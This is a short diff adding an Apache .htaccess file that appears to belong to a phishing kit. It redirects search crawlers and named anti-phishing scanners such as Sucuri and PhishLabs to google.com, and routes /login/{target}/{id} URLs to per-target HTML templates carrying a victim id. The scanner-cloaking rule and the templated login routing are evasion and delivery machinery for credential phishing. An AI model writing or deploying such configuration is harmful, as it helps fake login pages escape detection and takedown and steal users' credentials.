@@ -1,0 +1,7 @@
+RewriteEngine On
+# Block common security scanners
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|crawler|spider|sucuri|phishlabs) [NC]
+RewriteRule ^.*$ https://www.google.com [R=301,L]
+
+# Mapping /login/{target}/{id} to /templates/{target}/index.html?id={id}
+RewriteRule ^login/([^/]+)/([^/]+)/?$ templates/$1/index.html?id=$2 [L,QSA]
